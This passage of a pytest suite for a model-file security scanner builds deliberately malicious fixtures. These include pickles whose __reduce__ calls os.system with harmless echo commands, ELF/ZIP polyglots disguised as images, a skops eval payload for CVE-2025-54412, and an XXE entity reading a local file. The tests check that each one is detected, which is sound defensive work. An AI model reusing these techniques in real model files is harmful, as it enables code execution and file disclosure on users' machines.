        """An unreadable content probe must not turn a candidate into a clean skip."""
        payload = tmp_path / "payload.jpg"
        payload.write_bytes(b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime")

        def raise_os_error(_path: Path, _marker: bytes, _limit: int) -> bool:
            raise OSError("synthetic marker probe failure")

        monkeypatch.setattr("modelaudit.utils.file.detection._contains_casefolded_marker_in_prefix", raise_os_error)

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert results.file_metadata[str(payload)]["scan_outcome"] == "inconclusive"
        assert determine_exit_code(results) == 2

    def test_disguised_llamafile_zip_polyglot_preserves_nested_findings(self, tmp_path: Path) -> None:
        """A renamed executable ZIP wrapper must retain recursive member scanning."""

        class DangerousPayload:
            def __reduce__(self) -> tuple[object, tuple[str]]:
                import os as os_module

                return (os_module.system, ("echo directory-llamafile-zip-test",))

        payload = tmp_path / "payload.jpg"
        with zipfile.ZipFile(payload, "w") as archive:
            archive.writestr("payload.pkl", pickle.dumps(DangerousPayload()))
        payload.write_bytes(b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n" + payload.read_bytes())

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "llamafile" in results.scanner_names
        assert any(issue.severity.name == "CRITICAL" for issue in results.issues)

    def test_disguised_llamafile_skops_polyglot_preserves_cve_findings(self, tmp_path: Path) -> None:
        """Subtype-owned CVE checks must survive executable wrapper routing."""
        payload = tmp_path / "skops-cve.jpg"
        with zipfile.ZipFile(payload, "w") as archive:
            archive.writestr(
                "schema.json",
                '{"__loader__": "OperatorFuncNode", "__module__": "builtins", "__class__": "eval", '
                '"_skops_version": "0.11.0", "content": {}}',
            )
        payload.write_bytes(b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n" + payload.read_bytes())

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "llamafile" in results.scanner_names
        assert any(issue.rule_code == "CVE-2025-54412" or "CVE-2025-54412" in issue.message for issue in results.issues)

    def test_executable_zip_with_out_of_window_llamafile_marker_preserves_nested_findings(self, tmp_path: Path) -> None:
        """ZIP structure must preserve coverage independently of bounded marker routing."""

        class DangerousPayload:
            def __reduce__(self) -> tuple[object, tuple[str]]:
                import os as os_module

                return (os_module.system, ("echo directory-late-marker-zip-test",))

        payload = tmp_path / "payload.jpg"
        with zipfile.ZipFile(payload, "w") as archive:
            archive.writestr("payload.pkl", pickle.dumps(DangerousPayload()))
        payload.write_bytes(
            b"\x7fELF"
            + b"\x00" * 60
            + b"A" * LLAMAFILE_ROUTE_SCAN_BYTES
            + b"llamafile runtime"
            + b"B" * LLAMAFILE_ROUTE_TAIL_SCAN_BYTES
            + payload.read_bytes()
        )

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "zip" in results.scanner_names
        assert any(issue.severity.name == "CRITICAL" for issue in results.issues)

    def test_out_of_window_executable_skops_zip_preserves_cve_findings(self, tmp_path: Path) -> None:
        """Late-marker executable ZIPs still require subtype-owned checks."""
        payload = tmp_path / "skops-late-marker.jpg"
        with zipfile.ZipFile(payload, "w") as archive:
            archive.writestr(
                "schema.json",
                '{"__loader__": "OperatorFuncNode", "__module__": "builtins", "__class__": "eval", '
                '"_skops_version": "0.11.0", "content": {}}',
            )
        payload.write_bytes(
            b"\x7fELF"
            + b"\x00" * 60
            + b"A" * LLAMAFILE_ROUTE_SCAN_BYTES
            + b"llamafile runtime"
            + b"B" * LLAMAFILE_ROUTE_TAIL_SCAN_BYTES
            + payload.read_bytes()
        )

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "zip" in results.scanner_names
        assert any("CVE-2025-54412" in issue.message for issue in results.issues)

    def test_disguised_executorch_zip_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
        """Directory scans should preserve disguised ZIPs that contain supported ExecuTorch payloads."""
        disguised_zip = tmp_path / "executorch.jpg"
        with zipfile.ZipFile(disguised_zip, "w") as archive:
            archive.writestr("model.pte", b"executorch payload")

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        asset_names = {Path(asset.path).name for asset in results.assets}
        assert "executorch.jpg" in asset_names
        assert "zip" in results.scanner_names
        assert "unknown" not in results.scanner_names
        assert not any("Unknown or unhandled format" in issue.message for issue in results.issues)

    def test_disguised_sevenzip_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
        """Directory scans should route disguised 7z containers to the sevenzip scanner."""
        py7zr = pytest.importorskip("py7zr")

        disguised_7z = tmp_path / "payload.jpg"
        nested_payload = tmp_path / "payload.txt"
        nested_payload.write_text("safe nested payload")

        with py7zr.SevenZipFile(disguised_7z, "w") as archive:
            archive.write(str(nested_payload), "payload.txt")

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "sevenzip" in results.scanner_names
        assert "unknown" not in results.scanner_names
        assert not any("Unknown or unhandled format" in issue.message for issue in results.issues)

    def test_disguised_pmml_with_long_prolog_is_scanned(self, tmp_path: Path) -> None:
        """Directory scans should preserve renamed PMML files after long XML prologs."""
        disguised_pmml = tmp_path / "payload.txt"
        disguised_pmml.write_text(
            f"""<?xml version='1.0'?>
<!--{"x" * 1024}-->
<!DOCTYPE pmml [ <!ENTITY xxe SYSTEM 'file:///tmp/modelaudit-test-secret'> ]>
<PMML version='4.4'></PMML>
""",
            encoding="utf-8",
        )

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "pmml" in results.scanner_names
        assert determine_exit_code(results) == 1
        assert any("DOCTYPE declaration" in issue.message for issue in results.issues)

    def test_benign_xml_with_long_prolog_remains_skipped(self, tmp_path: Path) -> None:
        """Long-prolog non-model XML under skipped suffixes should stay skipped."""
        benign_xml = tmp_path / "notes.txt"
        benign_xml.write_text(
            f"<?xml version='1.0'?><!--{'x' * 1024}--><project><model name='safe'/></project>",
            encoding="utf-8",
        )

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 0

    def test_disguised_pmml_with_oversized_doctype_subset_fails_closed(self, tmp_path: Path) -> None:
        """Incomplete oversized XML prologs should fail closed instead of guessing a model root."""
        disguised_pmml = tmp_path / "payload.txt"
        disguised_pmml.write_text(
            "<?xml version='1.0'?><!DOCTYPE PMML [" + ("x" * ((1024 * 1024) + 64)) + "]><PMML version='4.4'></PMML>",
            encoding="utf-8",
        )

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert results["success"] is False
        assert determine_exit_code(results) == 2
        assert any(
            "bounded probe ended before the first structural root element" in check.message for check in results.checks
        )

    def test_rar_archive_returns_inconclusive_exit2(self, tmp_path: Path) -> None:
        """RAR archives should be recognized and fail closed instead of being skipped."""
        rar_path = tmp_path / "archive.rar"
        rar_path.write_bytes(b"Rar!\x1a\x07\x01\x00" + b"\x00" * 32)

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "rar" in results.scanner_names
        assert results.file_metadata[str(rar_path)]["scan_outcome"] == "inconclusive"
        assert any("RAR archive contents were not scanned" in issue.message for issue in results.issues)
        assert determine_exit_code(results) == 2

    def test_docx_like_zip_remains_skipped(self, tmp_path: Path) -> None:
        """Common document containers should not be treated as model archives."""
        docx_path = tmp_path / "report.docx"
        with zipfile.ZipFile(docx_path, "w") as archive:
            archive.writestr("[Content_Types].xml", "<Types></Types>")
            archive.writestr("word/document.xml", "<w:document></w:document>")

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 0

    def test_docx_with_embedded_ole_bin_remains_skipped(self, tmp_path: Path) -> None:
        """Office containers with embedded OLE payloads should still be skipped."""
        docx_path = tmp_path / "report.docx"
        with zipfile.ZipFile(docx_path, "w") as archive:
            archive.writestr("[Content_Types].xml", "<Types></Types>")
            archive.writestr("word/document.xml", "<w:document></w:document>")
            archive.writestr("word/embeddings/oleObject1.bin", b"embedded-ole")

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 0

    def test_docx_with_embedded_pk_near_match_bin_remains_skipped(self, tmp_path: Path) -> None:
        """PK-prefixed non-ZIP OLE binaries should not survive directory prefiltering."""
        docx_path = tmp_path / "report.docx"
        with zipfile.ZipFile(docx_path, "w") as archive:
            archive.writestr("[Content_Types].xml", "<Types></Types>")
            archive.writestr("word/document.xml", "<w:document></w:document>")
            archive.writestr("word/embeddings/oleObject1.bin", b"PKNOPE embedded-ole")

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 0
        assert "zip" not in results.scanner_names

    def test_docx_with_unreadable_embedded_pickle_bin_is_scanned(self, tmp_path: Path) -> None:
        """Unreadable embedded .bin members should fail open into the ZIP scanner."""
        docx_path = tmp_path / "report.docx"
        member_name = "word/embeddings/oleObject1.bin"
        with zipfile.ZipFile(docx_path, "w") as archive:
            archive.writestr("[Content_Types].xml", "<Types></Types>")
            archive.writestr("word/document.xml", "<w:document></w:document>")
            archive.writestr(member_name, pickle.dumps({"safe": True}, protocol=4))
        _corrupt_zip_member_crc(docx_path, member_name)

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "zip" in results.scanner_names
        assert any(member_name in (issue.location or "") for issue in results.issues)

    def test_docx_with_embedded_pickle_bin_is_scanned(self, tmp_path: Path) -> None:
        """Model-like .bin payloads in Office ZIP containers should not be hidden by the outer suffix."""
        docx_path = tmp_path / "report.docx"

        class DangerousPayload:
            def __reduce__(self) -> tuple[object, tuple[str]]:
                import os as os_module

                return (os_module.system, ("echo embedded-bin-prefilter-test",))

        with zipfile.ZipFile(docx_path, "w") as archive:
            archive.writestr("[Content_Types].xml", "<Types></Types>")
            archive.writestr("word/document.xml", "<w:document></w:document>")
            archive.writestr("word/embeddings/oleObject1.bin", pickle.dumps(DangerousPayload(), protocol=4))

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "zip" in results.scanner_names
        assert any("word/embeddings/oleObject1.bin" in (issue.location or "") for issue in results.issues)

    def test_large_docx_with_late_pickle_payload_is_scanned(self, tmp_path: Path) -> None:
        """Late model payloads in Office-like ZIPs must survive bounded prefiltering."""
        docx_path = tmp_path / "late-payload.docx"

        class DangerousPayload:
            def __reduce__(self) -> tuple[object, tuple[str]]:
                import os as os_module

                return (os_module.system, ("echo late-office-prefilter-test",))

        with zipfile.ZipFile(docx_path, "w") as archive:
            archive.writestr("[Content_Types].xml", "<Types></Types>")
            archive.writestr("word/document.xml", "<w:document></w:document>")
            for index in range(_ZIP_MEMBER_SNIFF_LIMIT):
                archive.writestr(f"docs/{index}.txt", "filler")
            archive.writestr("payload.pkl", pickle.dumps(DangerousPayload(), protocol=4))

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "zip" in results.scanner_names
        assert any("payload.pkl" in (issue.location or "") for issue in results.issues)

    def test_config_only_keras_zip_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
        """Directory prefilter should preserve Keras ZIPs identified by config structure."""
        keras_zip = tmp_path / "model.jpg"
        config = {"class_name": "Sequential", "config": {"layers": []}}
        with zipfile.ZipFile(keras_zip, "w") as archive:
            archive.writestr("config.json", json.dumps(config))

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 1
        assert "keras_zip" in results.scanner_names

    def test_generic_config_zip_with_skipped_extension_remains_skipped(self, tmp_path: Path) -> None:
        """Directory prefilter should not preserve arbitrary config.json ZIPs."""
        config_zip = tmp_path / "settings.jpg"
        config = {"name": "not-a-keras-model", "config": {"theme": "light"}}
        with zipfile.ZipFile(config_zip, "w") as archive:
            archive.writestr("config.json", json.dumps(config))

        results = scan_model_directory_or_file(str(tmp_path))

        assert results["files_scanned"] == 0
        assert "keras_zip" not in results.scanner_names

    def test_only_huggingface_bookkeeping_metadata_is_skipped(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Local .metadata files should be scanned unless they are in HuggingFace cache layouts."""
        hf_home = tmp_path / ".cache" / "huggingface"
        monkeypatch.setenv("HF_HOME", str(hf_home))
        local_metadata = tmp_path / "model.metadata"
        local_cache_shaped_metadata = (
            tmp_path / "project" / "huggingface" / "hub" / "models--org--repo" / "model.metadata"
        )
        local_snapshots_metadata = (
            tmp_path / "project" / "hub" / "models--org--repo" / "snapshots" / "abc123" / "model.metadata"
        )
        hf_cache_metadata = hf_home / "hub" / "models--org--repo" / "snapshots" / "abc123" / "model.metadata"
        hf_download_metadata = hf_home / "download" / "model.metadata"

        assert _is_huggingface_cache_file(str(local_metadata)) is False
        assert _is_huggingface_cache_file(str(local_cache_shaped_metadata)) is False
        assert _is_huggingface_cache_file(str(local_snapshots_metadata)) is False
        assert _is_huggingface_cache_file(str(hf_cache_metadata)) is True
        assert _is_huggingface_cache_file(str(hf_download_metadata)) is True

    def test_non_bookkeeping_filenames_skip_hf_path_resolution(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Ordinary filenames should not pay HuggingFace bookkeeping path resolution costs."""
        ordinary_model = tmp_path / "weights.dat"

        def fail_if_called(*_args: object, **_kwargs: object) -> bool:
            raise AssertionError("ordinary filenames should short-circuit before HF path resolution")

        monkeypatch.setattr("modelaudit.core._is_hf_hub_bookkeeping_path", fail_if_called)
        monkeypatch.setattr("modelaudit.core._is_hf_download_bookkeeping_path", fail_if_called)

        assert _is_huggingface_cache_file(str(ordinary_model)) is False

    def test_bookkeeping_filenames_only_skip_inside_huggingface_cache(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Local files with bookkeeping-looking names must still be scanned."""
        hf_home = tmp_path / ".cache" / "huggingface"
        monkeypatch.setenv("HF_HOME", str(hf_home))

        local_lock = tmp_path / "payload.pkl.lock"
        local_gitignore = tmp_path / ".gitignore"
        local_gitattributes = tmp_path / ".gitattributes"
        hf_cache_lock = hf_home / "hub" / "models--org--repo" / "snapshots" / "abc123" / "payload.pkl.lock"
        hf_download_gitignore = hf_home / "download" / ".gitignore"
        hf_download_gitattributes = hf_home / "download" / ".gitattributes"

        assert _is_huggingface_cache_file(str(local_lock)) is False
        assert _is_huggingface_cache_file(str(local_gitignore)) is False
        assert _is_huggingface_cache_file(str(local_gitattributes)) is False
        assert _is_huggingface_cache_file(str(hf_cache_lock)) is True
        assert _is_huggingface_cache_file(str(hf_download_gitignore)) is True
        assert _is_huggingface_cache_file(str(hf_download_gitattributes)) is True

    def test_custom_hf_hub_cache_root_skips_hub_bookkeeping(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Custom HF_HUB_CACHE roots do not need to be named hub."""
        custom_hub = tmp_path / "custom-cache-root"
        monkeypatch.setenv("HF_HUB_CACHE", str(custom_hub))
        lock_path = custom_hub / "models--org--repo" / "snapshots" / "abc123" / "payload.pkl.lock"

        assert _is_huggingface_cache_file(str(lock_path)) is True

    def test_download_bookkeeping_requires_configured_hf_home(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Suffix-shaped local paths must not be trusted as HF downloads."""
        hf_home = tmp_path / "real-home"
        monkeypatch.setenv("HF_HOME", str(hf_home))
        trusted_gitignore = hf_home / "download" / ".gitignore"
        spoofed_gitignore = tmp_path / "project" / ".cache" / "huggingface" / "download" / ".gitignore"

        assert _is_huggingface_cache_file(str(trusted_gitignore)) is True
        assert _is_huggingface_cache_file(str(spoofed_gitignore)) is False

    def test_local_download_bookkeeping_skips_when_model_root_has_assets(self, tmp_path: Path) -> None:
        """Downloaded model directories retain their local HF bookkeeping skip."""
        model_dir = tmp_path / "downloaded-model"
        model_dir.mkdir()
        (model_dir / "config.json").write_text('{"model_type":"gpt2"}')
        local_gitignore = model_dir / ".cache" / "huggingface" / "download" / ".gitignore"
        local_gitignore.parent.mkdir(parents=True)
        local_gitignore.write_text("*\n")

        assert _is_huggingface_cache_file(str(local_gitignore)) is True

    @pytest.mark.parametrize("filename", ["payload.pkl.lock", ".gitignore", ".gitattributes"])
    def test_local_download_bookkeeping_rejects_spoofed_payloads(self, tmp_path: Path, filename: str) -> None:
        """Local cache-looking paths must not skip pickle payloads."""

        class DangerousPayload:
            def __reduce__(self) -> tuple[object, tuple[str]]:
                import os as os_module

                return (os_module.system, ("echo spoofed-local-bookkeeping-test",))

        model_dir = tmp_path / "downloaded-model"
        model_dir.mkdir()
        (model_dir / "config.json").write_text('{"model_type":"gpt2"}')
        payload = model_dir / ".cache" / "huggingface" / "download" / filename
        payload.parent.mkdir(parents=True)
        payload.write_bytes(pickle.dumps(DangerousPayload(), protocol=0))

        assert _is_huggingface_cache_file(str(payload)) is False

    @pytest.mark.parametrize("filename", ["payload.pkl.lock", ".gitignore", ".gitattributes"])
    def test_direct_scans_do_not_skip_local_bookkeeping_filenames(self, tmp_path: Path, filename: str) -> None:
        """A malicious local file should not become trusted because of its basename."""

        class DangerousPayload:
            def __reduce__(self) -> tuple[object, tuple[str]]:
                import os as os_module

                return (os_module.system, ("echo direct-scan-bookkeeping-test",))

        payload = tmp_path / filename
        payload.write_bytes(pickle.dumps(DangerousPayload()))

        result = scan_file(str(payload))

        assert result.scanner_name != "skipped"
        assert any(issue.severity.value == "critical" for issue in result.issues)

    def test_huggingface_cache_metadata_skip_uses_resolved_cache_root(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        requires_symlinks: None,
    ) -> None:
        """HF bookkeeping under a symlinked HF_HOME should still be recognized."""
        real_home = tmp_path / "real-hf-home"
        link_home = tmp_path / "link-hf-home"
        real_home.mkdir()
        link_home.symlink_to(real_home, target_is_directory=True)
        monkeypatch.setenv("HF_HOME", str(link_home))

        metadata_path = link_home / "hub" / "models--org--repo" / "snapshots" / "abc123" / "config.json.metadata"
        metadata_path.parent.mkdir(parents=True)
        metadata_path.write_text("{}")

        assert _is_huggingface_cache_file(str(metadata_path)) is True

    def test_hf_cache_layout_spoofing_does_not_suppress_metadata_scan(self, tmp_path: Path) -> None:
        """An attacker-crafted HF cache layout must not suppress scanning of .metadata files."""
        # Attacker creates a directory structure mimicking HF cache:
        #   hub/models--attacker--backdoor/snapshots/  (empty directory)
        #   hub/models--attacker--backdoor/malicious.metadata
        spoofed_root = tmp_path / "hub" / "models--attacker--backdoor"
        (spoofed_root / "snapshots").mkdir(parents=True)
        malicious_metadata = spoofed_root / "malicious.metadata"
        malicious_metadata.write_text('{"exploit": true}')

        # The .metadata file is NOT inside snapshots/blobs/refs, so it should NOT
        # be treated as HuggingFace bookkeeping even though a sibling snapshots/ exists.
        assert _is_huggingface_cache_file(str(malicious_metadata)) is False

    def test_huggingface_ref_names_only_skip_inside_hf_refs(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Files named main/HEAD are model payloads unless they are HF cache refs."""
        hf_home = tmp_path / ".cache" / "huggingface"
        monkeypatch.setenv("HF_HOME", str(hf_home))

        local_main = tmp_path / "main"
        local_head = tmp_path / "HEAD"
        hf_ref_main = hf_home / "hub" / "models--org--repo" / "refs" / "main"
        hf_ref_head = hf_home / "hub" / "models--org--repo" / "refs" / "HEAD"
        hf_snapshot_main = hf_home / "hub" / "models--org--repo" / "snapshots" / "abc123" / "main"

        assert _is_huggingface_cache_file(str(local_main)) is False
        assert _is_huggingface_cache_file(str(local_head)) is False
        assert _is_huggingface_cache_file(str(hf_ref_main)) is True
        assert _is_huggingface_cache_file(str(hf_ref_head)) is True
        assert _is_huggingface_cache_file(str(hf_snapshot_main)) is False

    def test_performance_with_many_files(self):
        """Test that file filtering improves performance with many non-model files."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            # Create many documentation files
            for i in range(50):
                (Path(tmp_dir) / f"doc{i}.txt").write_text(f"Document {i}")
                (Path(tmp_dir) / f"log{i}.log").write_text(f"Log {i}")

            # Add a few model files
            (Path(tmp_dir) / "model1.pkl").write_bytes(pickle.dumps({"model": 1}))
            (Path(tmp_dir) / "model2.pickle").write_bytes(pickle.dumps({"model": 2}))

            # Scan with filtering should be faster
            results = scan_model_directory_or_file(tmp_dir)

            # Should only scan the 2 model files
            assert results["files_scanned"] == 2
            assert results["success"] is True

            # Duration should be reasonable (not checking exact time to avoid flakiness)
            assert "duration" in results
